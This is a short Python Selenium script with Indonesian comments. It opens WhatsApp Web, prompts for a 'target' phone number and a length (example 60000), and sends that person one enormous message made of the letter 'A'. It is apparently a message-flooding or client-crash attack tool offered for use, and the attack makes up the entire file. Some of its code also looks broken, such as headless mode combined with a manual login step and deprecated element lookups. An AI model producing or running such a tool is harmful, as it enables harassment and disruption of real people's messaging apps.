import os
import time
from selenium import webdriver
from selenium.webdriver.common.keys import Keys
from selenium.webdriver.chrome.options import Options

def send_whatsapp_message(phone_number, message):
    chrome_options = Options()
    chrome_options.add_argument('--headless')  # Run Chrome di background
    chrome_options.add_argument('--no-sandbox')  # Diperlukan untuk beberapa sistem Linux
    chrome_options.add_argument('--disable-dev-shm-usage')  # Mengatasi masalah memori

    # Path ke ChromeDriver (sesuaikan dengan lokasi ChromeDriver di sistem kamu atau tambahkan ke PATH)
    chromedriver_path = "/data/data/com.termux/files/usr/bin/chromedriver"  # Path default di Termux
    os.environ["webdriver.chrome.driver"] = chromedriver_path

    try:
        driver = webdriver.Chrome(chromedriver_path, options=chrome_options)
    except Exception as e:
        print(f"Error saat menjalankan ChromeDriver: {e}")
        print("Pastikan ChromeDriver sudah terinstall dan sesuai dengan versi Chrome.")
        return

    driver.get("https://web.whatsapp.com")

    input("Tekan Enter setelah WhatsApp Web selesai dimuat dan kamu sudah login...")

    try:
        search_box = driver.find_element_by_xpath('//div[@class="_13NKt copyable-text selectable-text"]')
        search_box.send_keys(phone_number)
        time.sleep(2)

        user_title = driver.find_element_by_xpath('//span[@title="{}"]'.format(phone_number))
        user_title.click()

        message_box = driver.find_element_by_xpath('//div[@class="_13NKt copyable-text selectable-text"]')
        message_box.send_keys(message + Keys.ENTER)

        time.sleep(2)
    except Exception as e:
        print(f"Error saat mengirim pesan: {e}")
    finally:
        driver.quit()

if __name__ == "__main__":
    phone_number = input("Masukkan nomor telepon target (dengan kode negara, contoh: +6281234567890): ")
    message_length = int(input("Masukkan panjang pesan yang ingin dikirim (contoh: 60000): "))
    message = "A" * message_length
    send_whatsapp_message(phone_number, message)
